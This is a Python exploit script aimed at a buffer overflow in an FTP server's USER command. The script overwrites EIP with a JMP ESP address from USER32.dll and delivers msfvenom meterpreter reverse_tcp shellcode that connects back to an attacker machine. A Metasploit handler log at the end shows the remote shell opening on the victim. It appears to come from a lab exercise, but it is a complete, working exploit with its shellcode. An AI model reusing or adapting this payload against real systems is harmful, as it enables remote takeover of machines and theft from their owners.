#!/usr/bin/python

import socket, sys
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 21))

print sock.recv(1500)

buffer = "A" * 485

"""
Run the program
View -> Executable Modules -> USER32.dll
Search for -> Command -> JMP ESP -> Note tha address
Replace BBBB with the address
This address will jump back to where the shellcode is located
"""

buffer += "\x53\x93\x42\x7e" # EIP Overwrite"

buffer += "\x90" * 100

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.13 -f c -a x86 -b "\x00\x0a\x0d\x40"
buffer += ("\xbe\x29\x9d\x65\x15\xdb\xd0\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x54\x31\x77\x13\x83\xc7\x04\x03\x77\x26\x7f\x90\xe9\xd0\xfd"
"\x5b\x12\x20\x62\xd5\xf7\x11\xa2\x81\x7c\x01\x12\xc1\xd1\xad"
"\xd9\x87\xc1\x26\xaf\x0f\xe5\x8f\x1a\x76\xc8\x10\x36\x4a\x4b"
"\x92\x45\x9f\xab\xab\x85\xd2\xaa\xec\xf8\x1f\xfe\xa5\x77\x8d"
"\xef\xc2\xc2\x0e\x9b\x98\xc3\x16\x78\x68\xe5\x37\x2f\xe3\xbc"
"\x97\xd1\x20\xb5\x91\xc9\x25\xf0\x68\x61\x9d\x8e\x6a\xa3\xec"
"\x6f\xc0\x8a\xc1\x9d\x18\xca\xe5\x7d\x6f\x22\x16\x03\x68\xf1"
"\x65\xdf\xfd\xe2\xcd\x94\xa6\xce\xec\x79\x30\x84\xe2\x36\x36"
"\xc2\xe6\xc9\x9b\x78\x12\x41\x1a\xaf\x93\x11\x39\x6b\xf8\xc2"
"\x20\x2a\xa4\xa5\x5d\x2c\x07\x19\xf8\x26\xa5\x4e\x71\x65\xa1"
"\xa3\xb8\x96\x31\xac\xcb\xe5\x03\x73\x60\x62\x2f\xfc\xae\x75"
"\x50\xd7\x17\xe9\xaf\xd8\x67\x23\x6b\x8c\x37\x5b\x5a\xad\xd3"
"\x9b\x63\x78\x49\x99\xf3\x43\x26\xa0\x0e\x2c\x35\xa3\x01\xf0"
"\xb0\x45\x71\x58\x93\xd9\x31\x08\x53\x8a\xd9\x42\x5c\xf5\xf9"
"\x6c\xb6\x9e\x93\x82\x6f\xf6\x0b\x3a\x2a\x8c\xaa\xc3\xe0\xe8"
"\xec\x48\x01\x0c\xa2\xb8\x60\x1e\xd2\xd8\x8a\xde\x22\x71\x8b"
"\xb4\x26\xd3\xdc\x20\x24\x02\x2a\xef\xd7\x61\x28\xe8\x27\xf4"
"\x19\x82\x11\x62\x26\xfc\x5d\x62\xa6\xfc\x0b\xe8\xa6\x94\xeb"
"\x48\xf5\x81\xf4\x44\x69\x1a\x60\x67\xd8\xce\x23\x0f\xe6\x29"
"\x03\x90\x19\x1c\x10\xd7\xe6\xe2\x34\x70\x8f\x1c\x78\x80\x4f"
"\x77\x78\xd0\x27\x8c\x57\xdf\x87\x6d\x72\x88\x8f\xe4\x12\x7a"
"\x31\xf8\x3f\xda\xef\xf9\xb3\xc7\xe6\x77\x34\xf8\x06\x76\x09"
"\x2e\x3f\x0c\x4a\xf2\x04\x1f\xe1\x57\x2c\x8a\x09\xcb\x2e\x9f")

buffer += "D" * ( 1100 - len(buffer) )

sock.send("USER " + buffer + "\r\n")

print sock.recv(1500)

sock.send("PASS demo@demo.com\r\n")

print sock.recv(1500)

sock.close()

"""
root@kali:~/Desktop# msfconsole 
                                                  
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% http://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


Payload caught by AV? Fly under the radar with Dynamic Payloads in
Metasploit Pro -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.12.23-dev                         ]
+ -- --=[ 1577 exploits - 907 auxiliary - 272 post        ]
+ -- --=[ 455 payloads - 39 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp 
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(handler) > exploit 

[*] Started reverse TCP handler on 192.168.1.13:4444 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.12
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.12:1130) at 2017-02-26 17:50:20 -0500

meterpreter > getuid
Server username: ABC\kanishka
meterpreter > 
"""
